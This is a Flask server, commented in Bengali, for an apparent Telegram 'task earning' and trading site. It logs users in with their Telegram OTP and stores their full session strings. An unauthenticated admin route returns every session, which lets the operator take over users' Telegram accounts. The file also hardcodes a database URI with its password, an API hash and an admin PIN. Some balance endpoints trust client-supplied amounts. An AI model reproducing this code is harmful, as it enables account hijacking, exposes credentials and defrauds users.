import os
import asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# ফ্লাস্ক অ্যাপ সেটআপ
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# CORS সেটিংস (আপনার অরিজিনাল সেটিংস)
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন (API ID/Hash & MongoDB)
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ডাটাবেস কানেকশন (টাইমআউট ফিক্সসহ মজবুত কানেকশন)
client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000, serverSelectionTimeoutMS=30000)
db = client_db['aaf_tele_earn_db']
users_col = db['users']
ads_col = db['ads']  
tasks_col = db['tasks'] 
withdraws_col = db['withdraws']

# টেম্পোরারি ক্লায়েন্ট স্টোর
temp_clients = {}

# ---------------------------------------------------------
# ১. HTML পেজ রাউটস (আপনার সব পেজ এখানে আছে)
# ---------------------------------------------------------

@app.route('/dashboard')
def render_dashboard_page(): 
    if 'uid' not in session: return render_template('login.html')
    return render_template('dashboard.html')

@app.route('/task')
def render_task_page(): 
    if 'uid' not in session: return render_template('login.html')
    return render_template('task.html')

@app.route('/treading')
def render_treading_page():
    if 'uid' not in session: return render_template('login.html')
    return render_template('treading.html')

@app.route('/account')
def render_account_page():
    if 'uid' not in session: return render_template('login.html')
    return render_template('account.html')

@app.route('/wallet')
def render_wallet_page(): 
    if 'uid' not in session: return render_template('login.html')
    return render_template('wallet.html')

# অ্যাডমিন পিন কনফিগারেশন
ADMIN_PIN = "Abdullah6790" 

@app.route('/admin')
def render_admin_panel():
    user_pin = request.args.get('pin')
    if user_pin == ADMIN_PIN:
        return render_template('admin.html')
    else:
        return f'''
        <div style="text-align:center; margin-top:100px; font-family:Arial; background:#0d1117; color:#c9d1d9; height:100vh; padding-top:50px;">
            <h1 style="color:#39d353;">AAF Admin Access</h1>
            <p>আপনার সিক্রেট পিন দিয়ে প্রবেশ করুন।</p>
            <form action="/admin" method="get">
                <input type="password" name="pin" placeholder="Enter PIN" style="padding:12px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#39d353; outline:none;">
                <button type="submit" style="padding:12px 25px; background:#39d353; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">Login</button>
            </form>
        </div>
        ''', 403


# ---------------------------------------------------------
# ২. ইউজার লগইন ও ওটিপি এপিআই (এরর ফিক্সড)
# ---------------------------------------------------------

@app.route('/api/send_otp', methods=['POST'])
def send_otp_handler():
    data = request.json
    phone = data.get('phone')
    if not phone: return jsonify({"success": False, "message": "Phone number missing"})

    try:
        # ইভেন্ট লুপ ফিক্স (এই ৪ লাইন আপনার এরর বন্ধ করবে)
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        
        result = client.send_code_request(phone)
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash}
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login_handler():
    data = request.json
    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})

    try:
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        
        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
        session_str = client.session.save()
        
        user_info = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "username": user.username,
            "session_string": session_str, 
            "last_login": datetime.utcnow()
        }
        
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": user_info, "$setOnInsert": {"main_balance": 0.00, "joined_at": datetime.utcnow(), "status": "active", "completed_tasks": 0}},
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id, "message": "Login Successful!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


# ---------------------------------------------------------
# ৩. ইউজার প্রোফাইল ও ড্যাশবোর্ড এপিআই
# ---------------------------------------------------------

@app.route('/api/user/dashboard_stats')
@app.route('/api/get_user_info')
def get_user_data():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False, "message": "Not logged in"})
    
    user = users_col.find_one({"telegram_id": uid})
    if user:
        return jsonify({
            "success": True,
            "balance": user.get('main_balance', 0.00),
            "name": user.get('name', 'User'),
            "phone": user.get('phone'),
            "id": user.get('telegram_id'),
            "total_tasks": user.get('completed_tasks', 0)
        })
    return jsonify({"success": False, "message": "User not found"})

@app.route('/api/user/tasks/claim', methods=['POST'])
def claim_task():
    try:
        data = request.json
        user_id = data.get('uid')
        task_id = data.get('task_id')

        # ১. ইউজার এবং টাস্ক খুঁজে বের করা
        user = users_col.find_one({"uid": user_id}) # আপনার ইউজার কালেকশন নাম অনুযায়ী চেক করুন
        task = tasks_col.find_one({"_id": ObjectId(task_id)}) # MongoDB ID দিয়ে খোঁজা

        if user and task:
            # ২. চেক করা: ইউজার কি এই টাস্ক আগে করেছে?
            if "completed_tasks" in user and task_id in user["completed_tasks"]:
                return jsonify({"status": "error", "message": "আপনি এই টাস্কটি আগেই করেছেন!"})

            reward_amount = float(task.get('reward', 0))

            # ৩. মেইন ব্যালেন্সে টাকা যোগ করা এবং টাস্ক আইডি সেভ করা
            users_col.update_one(
                {"uid": user_id},
                {
                    "$inc": {"balance": reward_amount}, 
                    "$push": {"completed_tasks": task_id}
                }
            )

            # ৪. নতুন ব্যালেন্স কত হলো তা চেক করা
            updated_user = users_col.find_one({"uid": user_id})
            
            return jsonify({
                "status": "success", 
                "reward": reward_amount, 
                "new_balance": updated_user.get('balance', 0)
            })

        return jsonify({"status": "error", "message": "তথ্য পাওয়া যায়নি!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/trade/execute', methods=['POST'])
def execute_trade():
    data = request.json
    uid = data.get('uid')
    trade_type = data.get('type') # BUY বা SELL
    amount = float(data.get('amount'))
    
    user = users_col.find_one({"uid": uid})
    if not user: return jsonify({"status": "error", "message": "User not found"})

    fee = amount * 0.10
    net_amount = amount - fee

    if trade_type == 'BUY':
        if user['balance'] < amount:
            return jsonify({"status": "error", "message": "অপর্যাপ্ত ব্যালেন্স (TK)!"})
        
        # TK কমবে, AAF বাড়বে
        users_col.update_one({"uid": uid}, {"$inc": {"balance": -amount, "aaf_balance": net_amount}})
    
    else: # SELL
        if user.get('aaf_balance', 0) < amount:
            return jsonify({"status": "error", "message": "অপর্যাপ্ত AAF ব্যালেন্স!"})
        
        # AAF কমবে, TK বাড়বে
        users_col.update_one({"uid": uid}, {"$inc": {"aaf_balance": -amount, "balance": net_amount}})

    return jsonify({"status": "success"})


# ---------------------------------------------------------
# ৪. ট্রেডিং ও ব্যালেন্স আপডেট এপিআই
# ---------------------------------------------------------

@app.route('/api/trade/update_result', methods=['POST'])
def update_treading_result():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False, "message": "Login required"})

    data = request.json
    amount = float(data.get('amount', 0))
    result = data.get('result') 
    profit_percent = 0.80 

    change = (amount * profit_percent) if result == 'win' else -amount
    
    users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": change}})
    return jsonify({"success": True, "message": "Balance Updated"})

@app.route('/api/add_balance', methods=['POST'])
def add_balance_from_task():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False})
    
    amount = float(request.json.get('amount', 0))
    users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": amount, "completed_tasks": 1}})
    return jsonify({"success": True})


# ---------------------------------------------------------
# ৫. অ্যাডমিন কন্ট্রোল এপিআই (সব অ্যাডমিন ফাংশন এখানে আছে)
# ---------------------------------------------------------

@app.route('/api/update_ads', methods=['POST'])
def manage_update_ads():
    try:
        data = request.json
        ads_list = data.get('ads', [])
        ads_col.delete_many({}) 
        if ads_list: ads_col.insert_many(ads_list)
        return jsonify({"success": True, "message": "Ads Updated!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/add_task', methods=['POST'])
def manage_add_task():
    try:
        task_data = request.json
        tasks_col.insert_one({
            "title": task_data.get('title'),
            "reward": float(task_data.get('reward', 0)),
            "link": task_data.get('link'),
            "status": "active",
            "created_at": datetime.utcnow()
        })
        return jsonify({"success": True, "message": "Task Added!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/admin/update_user', methods=['POST'])
def manage_update_user():
    try:
        data = request.json
        tg_id = int(data.get('telegram_id'))
        new_bal = float(data.get('balance', 0))
        users_col.update_one({"telegram_id": tg_id}, {"$set": {"main_balance": new_bal}})
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False})

@app.route('/api/admin/get_all_sessions')
def manage_get_sessions():
    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1, "telegram_id": 1}))
    return jsonify({"success": True, "sessions": users})


# ---------------------------------------------------------
# ৬. অ্যাড ও টাস্ক লোড এপিআই (ইউজারদের জন্য)
# ---------------------------------------------------------

@app.route('/api/get_active_ads')
@app.route('/api/get_ads')
def fetch_ads():
    return jsonify({"success": True, "ads": list(ads_col.find({}, {"_id": 0}))})

@app.route('/api/get_tasks')
def fetch_tasks():
    return jsonify({"success": True, "tasks": list(tasks_col.find({"status": "active"}, {"_id": 0}))})


# ---------------------------------------------------------
# ৭. সার্ভার রান ও পিঙ (সার্ভার সচল রাখার জন্য)
# ---------------------------------------------------------

@app.route('/ping')
def ping_checker(): 
    return "PONG", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
